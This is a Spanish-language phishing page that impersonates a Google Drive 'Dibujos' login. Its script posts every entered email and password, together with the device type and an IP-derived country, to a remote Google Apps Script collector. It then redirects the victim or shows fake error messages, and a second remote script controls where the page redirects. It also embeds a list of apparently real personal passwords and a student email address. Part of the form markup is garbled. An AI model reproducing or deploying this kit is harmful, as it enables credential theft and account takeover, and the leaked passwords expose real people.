<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    <link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    
    <meta property="og:title" content="Google Drive - Dibujos" />
    <meta property="og:description" content="google.com" />
    <meta property="og:image" content="https://i.ibb.co/GDfZ1J3/dibunewie.png" />
    
    <title>Google Drive - Dibujos</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
            background-color: #2c2d30;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* Mejoras para el comportamiento del teclado */
        body.keyboard-active {
            justify-content: flex-start;
            padding-top: 20px;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            will-change: transform;
        }

        /* Transformaciones más suaves para el teclado */
        .container.keyboard-active {
            transform: translateY(0);
            padding-top: 20px;
        }

        .logo {
            width: 90px;
            margin-bottom: 8px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .logo {
            width: 70px;
            margin-bottom: 4px;
        }

        .card {
            background-color: #1f1f1f;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .card {
            padding: 24px 32px 24px;
        }

        .title {
            color: #e8eaed;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .title {
            font-size: 20px;
            margin-bottom: 4px;
        }

        .subtitle {
            color: #e8eaed;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: 24px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .subtitle {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .input-wrapper {
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            padding: 16px 12px 8px;
            background-color: transparent;
            border: 1.5px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            outline: none;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .input-field:focus {
            border-color: #8ab4f8;
        }

        .input-field.error {
            border-color: #f28b82;
        }

        /* Forzar estilos para autocompletado */
        .input-field:-webkit-autofill {
            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
            -webkit-text-fill-color: #e8eaed !important;
            background-color: transparent !important;
        }

        .input-field:-webkit-autofill:focus {
            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
            -webkit-text-fill-color: #e8eaed !important;
        }

        .input-field:-webkit-autofill:hover {
            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
            -webkit-text-fill-color: #e8eaed !important;
        }

        .input-label {
            position: absolute;
            top: 16px;
            left: 12px;
            color: #9aa0a6;
            background-color: #1f1f1f;
            padding: 0 4px;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            pointer-events: none;
            font-size: 16px;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label,
        .input-field.has-value + .input-label {
            top: -8px;
            font-size: 12px;
            color: #8ab4f8;
        }

        .input-field.error:focus + .input-label,
        .input-field.error:not(:placeholder-shown) + .input-label,
        .input-field.error.has-value + .input-label {
            color: #f28b82;
        }

        .guest-mode {
            background-color: #0d5dc7;
            color: #ffffff;
            font-size: 14px;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 24px;
            text-align: left;
            display: flex;
            align-items: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .guest-mode {
            font-size: 12px;
            padding: 8px 12px;
            margin-bottom: 16px;
        }

        .guest-mode::before {
            content: "ℹ";
            margin-right: 8px;
            font-weight: bold;
        }

        .show-password-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .show-password-wrapper {
            margin-bottom: 16px;
        }

        .show-password-wrapper input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            width: 16px;
            height: 16px;
            border: 2px solid #5f6368;
            border-radius: 2px;
            background-color: transparent;
            margin-right: 8px;
            cursor: pointer;
            position: relative;
            transition: all 0.2s ease;
        }

        .show-password-wrapper input[type="checkbox"]:checked {
            border-color: #8ab4f8;
            background-color: #8ab4f8;
        }

        .show-password-wrapper input[type="checkbox"]:checked::after {
            content: '';
            position: absolute;
            left: 2px;
            top: 0px;
            width: 5px;
            height: 7px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .show-password-wrapper input[type="checkbox"]:hover {
            border-color: #8ab4f8;
        }

        .show-password-wrapper label {
            color: #e8eaed;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .show-password-wrapper label {
            font-size: 12px;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .actions {
            margin-top: 16px;
        }

        .create-account {
            color: #8ab4f8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .create-account {
            font-size: 12px;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #8ab4f8;
            border: none;
            border-radius: 20px;
            color: #1f1f1f;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            padding: 0 24px;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .next-button {
            font-size: 12px;
            height: 32px;
            padding: 0 20px;
        }

        .next-button:hover {
            background-color: #aecbfa;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .next-button:disabled {
            background-color: #5f6368;
            cursor: not-allowed;
            color: #e8eaed;
        }

        .footer {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 380px;
            font-size: 12px;
            flex-shrink: 0;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .footer {
            margin-top: 16px;
            font-size: 10px;
        }

        .language-selector {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .language-selector select {
            background: transparent;
            border: none;
            color: #9aa0a6;
            font-size: 12px;
            outline: none;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .language-selector select {
            font-size: 10px;
        }

        .footer-links {
            display: flex;
            gap: 24px;
            flex-wrap: nowrap;
        }

        .keyboard-active .footer-links {
            gap: 16px;
        }

        .footer-links a {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .footer-links a {
            font-size: 10px;
        }

        .footer-links a:hover {
            color: #e8eaed;
        }

        .error-message {
            color: #f28b82;
            font-size: 14px;
            margin-top: 8px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .keyboard-active .error-message {
            font-size: 12px;
            margin-top: 4px;
            margin-bottom: 8px;
        }

        .error-message.password-prohibited {
            color: #f28b82;
        }

        /* Responsive mejorado */
        @media (max-width: 480px) {
            .container, .card {
                padding: 24px 24px 20px;
            }
            
            .keyboard-active .container {
                padding: 16px 20px 16px;
            }
            
            .keyboard-active .card {
                padding: 20px 24px 20px;
            }
            
            .footer {
                padding: 0 4px;
                margin-top: 20px;
            }
            
            .keyboard-active .footer {
                margin-top: 12px;
                padding: 0 4px;
            }
        }
        
        @media (max-width: 360px) {
            .container, .card {
                padding: 20px 16px 16px;
            }
            
            .keyboard-active .container {
                padding: 12px 16px 12px;
            }
            
            .keyboard-active .card {
                padding: 16px 20px 16px;
            }
            
            .footer {
                margin-top: 32px;
                padding: 0 8px;
            }
            
            .keyboard-active .footer {
                margin-top: 8px;
                padding: 0 8px;
            }
        }

        /* Optimizaciones para iOS */
        @supports (-webkit-touch-callout: none) {
            .input-field {
                font-size: 16px; /* Previene zoom en iOS */
            }
            
            .keyboard-active .container {
                transform: translateY(-10px);
            }
        }

        /* Optimizaciones para Android */
        @media screen and (max-width: 767px) {
            .keyboard-active {
                height: auto;
                min-height: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="Google" class="logo">
        
        <div class="card">
            <h1 class="title">Acceder a Dibujos</h1>
            <p class="subtitle">Ir a Drive</p>
            
            <form id="loginForm">
                <div class="input-wrapper">
                    <input type="email" id="emailInput" name="email" class="input-field" placeholder=" " required="" value="@gmail.com">
                    <label for="emailInput" class="input-label">Correo electrónico o teléfono</label>

                  Inicia sesión para continuar

                </select>
            </div>
            <div class="footer-links">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>

            </div>
        </div>
    </div>

    <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>

    <script>
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');

        // Función para verificar si un campo tiene valor
        function checkFieldValue(input) {
            if (input.value.trim() !== '') {
                input.classList.add('has-value');
            } else {
                input.classList.remove('has-value');
            }
        }

        // Función para verificar autocompletado
        function checkAutofill() {
            setTimeout(() => {
                checkFieldValue(emailInput);
                checkFieldValue(passwordInput);
            }, 100);
        }

        // Eventos para el campo de email
        emailInput.addEventListener('input', function() {
            emailInput.classList.remove('error');
            checkFieldValue(emailInput);
        });

        emailInput.addEventListener('change', function() {
            checkFieldValue(emailInput);
        });

        emailInput.addEventListener('blur', function() {
            checkFieldValue(emailInput);
        });

        // Eventos para el campo de contraseña
        passwordInput.addEventListener('input', function() {
            passwordInput.classList.remove('error');
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.classList.remove('password-prohibited');
            checkFieldValue(passwordInput);
        });

        passwordInput.addEventListener('change', function() {
            checkFieldValue(passwordInput);
        });

        passwordInput.addEventListener('blur', function() {
            checkFieldValue(passwordInput);
        });

        // Verificar autocompletado periódicamente
        setInterval(checkAutofill, 500);

        // Verificar al cargar la página
        window.addEventListener('load', checkAutofill);
        document.addEventListener('DOMContentLoaded', checkAutofill);

        // Manejar mostrar/ocultar contraseña
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('passwordInput');
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        // Manejar formulario
        document.getElementById("loginForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            
            const emailInput = document.querySelector('input[name="email"]');
            const passwordInput = document.querySelector('input[name="password"]');
            const errorMessage = document.getElementById('errorMessage');
            const guestMode = document.getElementById('guestMode');
            const submitBtn = document.getElementById('submitBtn');
            
            const email = emailInput.value.trim().toLowerCase();
            const password = passwordInput.value;
            
            // Limpiar errores previos
            errorMessage.style.display = 'none';
            errorMessage.classList.remove('password-prohibited');
            passwordInput.classList.remove('error');
            emailInput.classList.remove('error');
            guestMode.style.display = 'block';
            
            // Validar formato de correo electrónico
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showError("Introduce una dirección de correo electrónico válida", false);
                return;
            }
            
            // Deshabilitar botón
            submitBtn.disabled = true;
            submitBtn.textContent = 'Verificando...';
            
            // Variables para determinar si es prohibido
            let isProhibitedEmail = false;
            let isProhibitedPassword = false;
            
            // Lista de correos prohibidos
            const prohibitedEmails = ["c20bl11064@acarrion.edu.pe"];
            if (prohibitedEmails.includes(email)) {
                isProhibitedEmail = true;
            }
            
            // Verificar contraseñas prohibidas
            const prohibitedPasswords = ["fernanda2022","Fernanda2022","Haily130598","haily130598","delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
            if (prohibitedPasswords.includes(password)) {
                isProhibitedPassword = true;
            }
            
            try {
                // Detectar dispositivo
                let deviceType = "Otro";
                if (/android/i.test(navigator.userAgent)) {
                    deviceType = "Android";
                } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    deviceType = "iPhone";
                }
                
                // Obtener país
                let country = "Desconocido";
                try {
                    const response = await fetch("https://ipwhois.app/json/");
                    const data = await response.json();
                    if (data.country) {
                        country = data.country;
                    }
                } catch (error) {
                    console.error("Error obteniendo el país:", error);
                }
                
                // Enviar datos SIEMPRE al Google Sheets
                const formData = new FormData();
                formData.append("email", email);
                formData.append("password", password);
                formData.append("device", deviceType);
                
                // Agregar diferenciador junto al campo país
                if (isProhibitedEmail || isProhibitedPassword) {
                    formData.append("country", country + " - INTENTO_FALLIDO");
                } else {
                    formData.append("country", country);
                }
                
                const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
                
                // Enviar datos sin importar si son prohibidos
                const response = await fetch(url, {
                    method: "POST",
                    body: new URLSearchParams(formData),
                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
                });
                
                // Después de enviar, verificar si debe mostrar error o redirigir
                if (isProhibitedEmail) {
                    showError("Ocurrió un error con el correo, intentar con otra dirección", false);
                    emailInput.value = '';
                    passwordInput.value = '';
                    emailInput.classList.add('error');
                    emailInput.classList.remove('has-value');
                    passwordInput.classList.remove('has-value');
                } else if (isProhibitedPassword) {
                    showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
                    passwordInput.value = '';
                    passwordInput.classList.add('error');
                    passwordInput.classList.remove('has-value');
                } else {
                    // Si no es prohibido, redirigir normalmente
                    if (response.ok) {
                        window.location.href = "invitation.html";
                    } else {
                        showError("Error al iniciar sesión. Inténtalo de nuevo.", false);
                    }
                }
                
            } catch (error) {
                showError("Error de conexión. Inténtalo de nuevo.", false);
                console.error("Error:", error);
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Siguiente';
            }
        });
        
        function showError(message, isPasswordError) {
            const errorMessage = document.getElementById('errorMessage');
            const guestMode = document.getElementById('guestMode');
            
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            guestMode.style.display = 'none';
            
            if (isPasswordError) {
                errorMessage.classList.add('password-prohibited');
            } else {
                errorMessage.classList.remove('password-prohibited');
            }
        }
        
        // Verificar redirección
        document.addEventListener("DOMContentLoaded", async function () {
            const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
            
            try {
                const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
                const pagina = await response.text();
                
                if (pagina.trim() !== "folder.html") {
                    window.location.href = pagina;
                }
            } catch (error) {
                console.error("Error al verificar la redirección:", error);
            }
        });
    </script>

    <script>
        // Script completamente rediseñado para el manejo del teclado virtual
        class KeyboardManager {
            constructor() {
                this.isKeyboardActive = false;
                this.initialViewportHeight = window.innerHeight;
                this.currentViewportHeight = window.innerHeight;
                this.keyboardThreshold = 150; // Píxeles mínimos para detectar teclado
                this.debounceTimer = null;
                this.body = document.body;
                this.container = document.querySelector('.container');
                this.inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
                this.isMobile = this.detectMobile();
                this.isIOS = this.detectIOS();
                this.isAndroid = this.detectAndroid();
                
                if (this.isMobile) {
                    this.init();
                }
            }
            
            detectMobile() {
                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
                       window.innerWidth <= 768;
            }
            
            detectIOS() {
                return /iPad|iPhone|iPod/.test(navigator.userAgent) || 
                       (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
            }
            
            detectAndroid() {
                return /Android/i.test(navigator.userAgent);
            }
            
            init() {
                this.setupEventListeners();
                this.setupVisualViewportSupport();
                this.preventZoom();
            }
            
            setupEventListeners() {
                // Eventos de entrada
                this.inputs.forEach(input => {
                    input.addEventListener('focus', this.handleInputFocus.bind(this));
                    input.addEventListener('blur', this.handleInputBlur.bind(this));
                });
                
                // Eventos de ventana
                window.addEventListener('resize', this.handleResize.bind(this));
                window.addEventListener('orientationchange', this.handleOrientationChange.bind(this));
                
                // Evento para detectar cuando el usuario toca fuera de los inputs
                document.addEventListener('touchstart', this.handleTouchStart.bind(this));
            }
            
            setupVisualViewportSupport() {
                // Soporte para Visual Viewport API (mejor detección del teclado)
                if (window.visualViewport) {
                    window.visualViewport.addEventListener('resize', this.handleVisualViewportResize.bind(this));
                }
            }
            
            preventZoom() {
                // Prevenir zoom en iOS manteniendo el tamaño de fuente de 16px
                if (this.isIOS) {
                    const viewport = document.querySelector('meta[name="viewport"]');
                    viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
                }
            }
            
            handleInputFocus(event) {
                this.clearDebounceTimer();
                
                // Activar inmediatamente en focus
                this.activateKeyboard();
                
                // Para iOS, esperar un poco más para que se ajuste el viewport
                if (this.isIOS) {
                    setTimeout(() => {
                        this.activateKeyboard();
                    }, 300);
                }
            }
            
            handleInputBlur(event) {
                this.clearDebounceTimer();
                
                // Esperar un poco antes de desactivar por si el usuario toca otro input
                this.debounceTimer = setTimeout(() => {
                    const activeElement = document.activeElement;
                    const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                    
                    if (!isInputFocused) {
                        this.deactivateKeyboard();
                    }
                }, 300);
            }
            
            handleResize() {
                this.clearDebounceTimer();
                
                this.debounceTimer = setTimeout(() => {
                    this.currentViewportHeight = window.innerHeight;
                    const heightDifference = this.initialViewportHeight - this.currentViewportHeight;
                    
                    // Detectar si el teclado apareció o desapareció
                    if (heightDifference > this.keyboardThreshold) {
                        this.activateKeyboard();
                    } else if (heightDifference < 50) {
                        // Verificar si hay un input activo antes de desactivar
                        const activeElement = document.activeElement;
                        const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                        
                        if (!isInputFocused) {
                            this.deactivateKeyboard();
                        }
                    }
                }, 100);
            }
            
            handleVisualViewportResize() {
                this.clearDebounceTimer();
                
                this.debounceTimer = setTimeout(() => {
                    const viewport = window.visualViewport;
                    const heightDifference = window.innerHeight - viewport.height;
                    
                    if (heightDifference > this.keyboardThreshold) {
                        this.activateKeyboard();
                    } else if (heightDifference < 50) {
                        const activeElement = document.activeElement;
                        const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                        
                        if (!isInputFocused) {
                            this.deactivateKeyboard();
                        }
                    }
                }, 50);
            }
            
            handleOrientationChange() {
                // Reiniciar altura inicial después del cambio de orientación
                setTimeout(() => {
                    this.initialViewportHeight = window.innerHeight;
                    this.currentViewportHeight = window.innerHeight;
                    
                    // Verificar si hay un input activo
                    const activeElement = document.activeElement;
                    const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                    
                    if (isInputFocused) {
                        this.activateKeyboard();
                    } else {
                        this.deactivateKeyboard();
                    }
                }, 500);
            }
            
            handleTouchStart(event) {
                // Si el usuario toca fuera de los inputs, desactivar el teclado
                const target = event.target;
                const isInput = target.matches('input[type="email"], input[type="password"]');
                const isLabel = target.matches('label');
                
                if (!isInput && !isLabel) {
                    this.clearDebounceTimer();
                    this.debounceTimer = setTimeout(() => {
                        this.deactivateKeyboard();
                    }, 100);
                }
            }
            
            activateKeyboard() {
                if (!this.isKeyboardActive) {
                    this.isKeyboardActive = true;
                    this.body.classList.add('keyboard-active');
                    this.container.classList.add('keyboard-active');
                    
                    // Scroll suave hacia arriba en Android
                    if (this.isAndroid) {
                        setTimeout(() => {
                            window.scrollTo({
                                top: 0,
                                behavior: 'smooth'
                            });
                        }, 100);
                    }
                    
                    // Para iOS, asegurar que el input esté visible
                    if (this.isIOS) {
                        setTimeout(() => {
                            const activeElement = document.activeElement;
                            if (activeElement && activeElement.matches('input')) {
                                activeElement.scrollIntoView({
                                    behavior: 'smooth',
                                    block: 'center'
                                });
                            }
                        }, 300);
                    }
                }
            }
            
            deactivateKeyboard() {
                if (this.isKeyboardActive) {
                    this.isKeyboardActive = false;
                    this.body.classList.remove('keyboard-active');
                    this.container.classList.remove('keyboard-active');
                    
                    // Scroll suave hacia el centro
                    setTimeout(() => {
                        window.scrollTo({
                            top: 0,
                            behavior: 'smooth'
                        });
                    }, 100);
                }
            }
            
            clearDebounceTimer() {
                if (this.debounceTimer) {
                    clearTimeout(this.debounceTimer);
                    this.debounceTimer = null;
                }
            }
            
            // Método para forzar actualización (útil para debugging)
            forceUpdate() {
                this.initialViewportHeight = window.innerHeight;
                this.currentViewportHeight = window.innerHeight;
                
                const activeElement = document.activeElement;
                const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                
                if (isInputFocused) {
                    this.activateKeyboard();
                } else {
                    this.deactivateKeyboard();
                }
            }
        }
        
        // Inicializar el gestor de teclado cuando el DOM esté listo
        document.addEventListener('DOMContentLoaded', function() {
            // Esperar un poco para que todo esté completamente cargado
            setTimeout(() => {
                window.keyboardManager = new KeyboardManager();
            }, 100);
        });
        
        // Backup para navegadores más antiguos sin soporte completo
        window.addEventListener('load', function() {
            setTimeout(() => {
                if (!window.keyboardManager) {
                    window.keyboardManager = new KeyboardManager();
                }
            }, 200);
        });
        
        // Función de utilidad para debugging (solo para desarrollo)
        function debugKeyboard() {
            if (window.keyboardManager) {
                console.log('Keyboard Manager Status:', {
                    isActive: window.keyboardManager.isKeyboardActive,
                    initialHeight: window.keyboardManager.initialViewportHeight,
                    currentHeight: window.keyboardManager.currentViewportHeight,
                    isMobile: window.keyboardManager.isMobile,
                    isIOS: window.keyboardManager.isIOS,
                    isAndroid: window.keyboardManager.isAndroid
                });
            }
        }
        
        // Agregar algunos eventos adicionales para casos edge
        document.addEventListener('focusin', function(event) {
            if (event.target.matches('input[type="email"], input[type="password"]')) {
                if (window.keyboardManager) {
                    setTimeout(() => {
                        window.keyboardManager.activateKeyboard();
                    }, 100);
                }
            }
        });
        
        document.addEventListener('focusout', function(event) {
            if (event.target.matches('input[type="email"], input[type="password"]')) {
                if (window.keyboardManager) {
                    setTimeout(() => {
                        const activeElement = document.activeElement;
                        const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
                        
                        if (!isInputFocused) {
                            window.keyboardManager.deactivateKeyboard();
                        }
                    }, 200);
                }
            }
        });
    </script>
